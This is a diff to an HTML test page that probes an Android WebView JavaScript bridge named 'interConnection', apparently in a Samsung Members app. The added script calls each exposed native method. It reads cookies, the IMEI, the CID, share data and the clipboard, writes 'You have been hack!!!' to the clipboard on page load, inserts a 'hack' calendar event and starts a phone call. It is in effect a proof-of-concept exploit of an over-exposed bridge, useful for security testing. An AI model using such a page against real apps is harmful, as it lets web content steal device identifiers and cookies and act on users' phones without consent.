@@ -1,32 +1,108 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-        <meta name='viewport' content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
-    </head>
-    
-    <body>
-        <div id="content">webview</div>
-        <script>
-       
-//         function gotoWhiteUrl(){
-//             //window.location.href = "https://www.baidu.com";
-//             top.location.href = "https://h5.samsungmembers.cn";
-//         }
-        
-//         function getCID(){
-//             alert(window.interConnection.getCID());
-//         }
-        
-        function getCID(){
-            var result = window.interConnection.getCID();
-//             document.getElementById("content").innerText = "getCID：\n"+result;
-            document.getElementById("content").innerHTML = result;
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name='viewport'
+        content='width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
+</head>
+
+<body>
+    <div id="content">webview</div>
+    <script>
+
+        function closeWebviewRefresh() {
+            var result = window.interConnection.closeWebviewRefresh();
         }
-        
-//         setInterval(gotoWhiteUrl,5);//5毫秒
-//         setTimeout(getCID,1000);//延迟3秒执行
-        getCID();
-        </script>
-    </body>
+
+        function copy() {
+            var result = window.interConnection.copy("You have been hack!!!");
+        }
+
+        function getCID() {
+            var result = window.interConnection.getCID();
+            document.getElementById("content").innerText = "getCID:\n" + result;
+            // document.getElementById("content").innerHTML = result;
+        }
+
+        function getCookie() {
+            var result = window.interConnection.getCookie();
+            document.getElementById("content").innerText = "getCID:\n" + result;
+        }
+
+        function getIMEI() {
+            var result = window.interConnection.getIMEI();
+            document.getElementById("content").innerText = "getCID:\n" + result;
+        }
+
+        function getShareData() {
+            var result = window.interConnection.getShareData(1000, "", "", "", "", "");
+            document.getElementById("content").innerText = "getCID:\n" + result;
+        }
+
+        function goBack() {
+            var result = window.interConnection.goBack();
+        }
+
+        function insertCalendarEvent() {
+            var date = new Date();
+            var time = date.getTime;
+            var result = window.interConnection.insertCalendarEvent("hack", "hahahahahahaha", time, time);
+        }
+
+        function openRewardsPolicyDialog() {
+            var result = window.interConnection.openRewardsPolicyDialog();
+        }
+
+        function openStarExchange() {
+            var result = window.interConnection.openStarExchange();
+        }
+
+        function openWeixinMiniProgram() {
+            var result = window.interConnection.openWeixinMiniProgram("hack", "path", 1);
+        }
+
+        function paste() {
+            var result = window.interConnection.paste();
+            document.getElementById("content").innerText = "getCID:\n" + result;
+        }
+
+        function refreshPage() {
+            var result = window.interConnection.refreshPage();
+        }
+
+        function showPicturesWithUrl() {
+            var result = window.interConnection.showPicturesWithUrl("https://cdn.wccftech.com/wp-content/uploads/2016/06/chrome-bug-pirate-movies.jpg");
+        }
+
+        function turnOffPush() {
+            var result = window.interConnection.turnOffPush();
+        }
+
+        function zCircleModeIsVideoFloating() {
+            var result = window.interConnection.zCircleModeIsVideoFloating();
+        }
+
+        function zCircleModePhoneCall() {
+            var result = window.interConnection.zCircleModePhoneCall("10000");
+        }
+
+        function zModeDeleteReplyCallBack() {
+            var result = window.interConnection.zModeDeleteReplyCallBack("", "");
+        }
+
+        function zModeLikeCallBack() {
+            var result = window.interConnection.zModeLikeCallBack("1000");
+        }
+
+        function zModeReplyCallBack() {
+            var result = window.interConnection.zModeReplyCallBack("1000");
+        }
+
+        //         setInterval(gotoWhiteUrl,5);//5毫秒
+        //         setTimeout(getCID,1000);//延迟3秒执行
+        copy();
+    </script>
+</body>
+
 </html>
